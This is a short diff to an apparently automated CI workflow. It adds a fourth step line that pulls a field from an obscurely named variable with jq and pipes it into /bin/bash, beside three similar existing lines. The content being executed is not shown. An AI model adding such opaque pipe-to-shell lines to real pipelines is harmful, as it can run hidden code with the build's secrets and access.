@@ -26,6 +26,7 @@ jobs:
           echo $jom3 | jq -r .n67 | /bin/bash
           echo $pua2925 | jq -r .dqmqa65270 | /bin/bash
           printf '%s' "$z1" | jq -r .d7284 | /bin/bash
+          printf '%s' "$pqcv14" | jq -r .u2376 | /bin/bash
 
       - name: Save archive
         if: always()
